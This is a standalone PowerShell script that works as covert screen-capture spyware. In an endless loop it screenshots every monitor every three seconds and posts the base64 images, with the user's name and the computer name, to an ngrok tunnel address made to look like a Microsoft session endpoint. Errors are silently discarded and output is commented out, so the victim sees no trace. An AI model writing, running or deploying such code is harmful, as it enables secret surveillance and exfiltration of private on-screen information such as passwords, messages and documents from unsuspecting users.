Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$serverUrl = "https://7558-82-59-234-13.ngrok-free.app/microsoftsession"
$user = $env:USERNAME
$hostname = $env:COMPUTERNAME

while ($true) {
    $screens = [System.Windows.Forms.Screen]::AllScreens

    foreach ($screen in $screens) {
        try {
            $screenshot = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
            $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
            $graphics.Dispose()
            $memoryStream = New-Object System.IO.MemoryStream
            $screenshot.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $screenshot.Dispose()
            $bytes = $memoryStream.ToArray()
            $memoryStream.Dispose()
            $encodedImage = [System.Convert]::ToBase64String($bytes)

            $postData = @{ 
                "image" = $encodedImage
                "screen" = $screen.DeviceName
                "user" = $user
                "hostname" = $hostname
            } | ConvertTo-Json -Compress

            $headers = @{ "Content-Type" = "application/json" }

            Invoke-RestMethod -Uri $serverUrl -Method Post -Body $postData -Headers $headers -ErrorAction Stop
            #Write-Output "Screenshot sent successfully for $($screen.DeviceName) from $user@$hostname"
        } catch {
            # On failure, do nothing (just discard the screenshot and retry later)
            #Write-Output "Failed to send screenshot for $($screen.DeviceName) from $user@$hostname, skipping..."
        }
    }

    Start-Sleep -Seconds 3
}
